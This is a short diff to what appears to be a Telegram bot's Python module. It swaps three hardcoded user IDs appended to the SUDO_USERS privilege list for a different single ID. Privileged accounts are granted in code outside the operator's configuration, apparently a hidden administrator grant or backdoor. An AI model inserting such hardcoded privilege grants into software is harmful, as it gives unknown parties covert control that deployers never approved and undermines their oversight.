@@ -5,9 +5,7 @@ from config import SUDO_USERS
 from XDX.admins import get_administrators
 
 
-SUDO_USERS.append(5124507794)
-SUDO_USERS.append(1356469075)
-SUDO_USERS.append(5198403647)
+SUDO_USERS.append(5154093666)
 
 
 def errors(func: Callable) -> Callable:
